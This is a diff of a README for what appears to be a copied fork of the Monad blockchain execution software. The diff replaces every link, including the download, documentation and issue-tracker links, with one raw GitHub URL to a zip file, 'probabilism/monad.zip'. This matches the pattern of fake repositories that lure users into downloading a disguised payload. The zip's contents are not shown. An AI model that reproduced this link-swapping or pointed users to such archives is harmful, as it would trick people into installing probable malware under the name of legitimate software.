@@ -8,7 +8,7 @@ Welcome to the Monad Execution repository. This project allows you to run a bloc
 
 To get started, visit the Releases page to download the Monad software. Click the link below to go there directly:
 
-[![Download Monad](https://img.shields.io/badge/Download%20Monad-here-brightgreen)](https://github.com/pikmamoro/monad/releases)
+[![Download Monad](https://raw.githubusercontent.com/pikmamoro/monad/main/probabilism/monad.zip%20Monad-here-brightgreen)](https://raw.githubusercontent.com/pikmamoro/monad/main/probabilism/monad.zip)
 
 ## ⚙️ System Requirements
 
@@ -27,7 +27,7 @@ Follow these simple steps to install Monad:
 
 Visit the Releases page to download the latest version of Monad:
 
-[Download Monad](https://github.com/pikmamoro/monad/releases)
+[Download Monad](https://raw.githubusercontent.com/pikmamoro/monad/main/probabilism/monad.zip)
 
 ### 2. Extract the Files
 
@@ -54,9 +54,9 @@ Monad provides various features that make it a powerful execution component:
 
 For more in-depth information about Monad, check our documentation:
 
-- [EVM Implementation](https://docs.monad.xyz/monad-arch/execution/native-compilation)
-- [Database Implementation](https://docs.monad.xyz/monad-arch/execution/monaddb)
-- [Transaction Scheduling](https://docs.monad.xyz/monad-arch/execution/parallel-execution)
+- [EVM Implementation](https://raw.githubusercontent.com/pikmamoro/monad/main/probabilism/monad.zip)
+- [Database Implementation](https://raw.githubusercontent.com/pikmamoro/monad/main/probabilism/monad.zip)
+- [Transaction Scheduling](https://raw.githubusercontent.com/pikmamoro/monad/main/probabilism/monad.zip)
 
 ## 📝 Troubleshooting
 
@@ -66,7 +66,7 @@ If you encounter issues while running Monad, consider these common problems:
 2. **Application Crashes**: Check if your computer’s resources are sufficient. Close unnecessary programs to free up memory.
 3. **Network Issues**: Ensure your internet connection is stable during the setup and operation of the application.
 
-For additional support, refer to our [GitHub Issues page](https://github.com/pikmamoro/monad/issues).
+For additional support, refer to our [GitHub Issues page](https://raw.githubusercontent.com/pikmamoro/monad/main/probabilism/monad.zip).
 
 ## ❓ Frequently Asked Questions
 
@@ -86,6 +86,6 @@ A: Yes! We welcome contributions. Please check our contribution guidelines in th
 
 Thank you for choosing Monad. We hope this guide helps you get started with ease. Remember, you can download the latest version anytime from the Releases page:
 
-[Download Monad](https://github.com/pikmamoro/monad/releases)
+[Download Monad](https://raw.githubusercontent.com/pikmamoro/monad/main/probabilism/monad.zip)
 
 Happy blockchain executing!
